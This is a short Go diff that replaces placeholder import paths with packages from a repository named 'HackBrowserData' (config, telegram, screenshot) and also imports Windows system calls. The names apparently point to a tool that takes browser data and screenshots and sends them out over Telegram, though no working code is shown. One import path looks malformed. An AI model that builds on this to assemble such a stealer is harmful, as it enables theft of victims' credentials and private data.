@@ -8,9 +8,9 @@ import (
     "time"
     "unsafe"
 
-    "github.com/yourusername/yourmodule/config"
-    "github.com/yourusername/yourmodule/telegram"
-    "github.com/yourusername/yourmodule/screenshot"
+    "github.com/GiwaMIcheal/HackBrowserData/config"
+    "github.com/GiwaMIcheal/HackBrowserData/telegram"
+    "github.com/GiwaMIcheal/HackBrowserData/config.go/screenshot"
     "golang.org/x/sys/windows"
 )
 
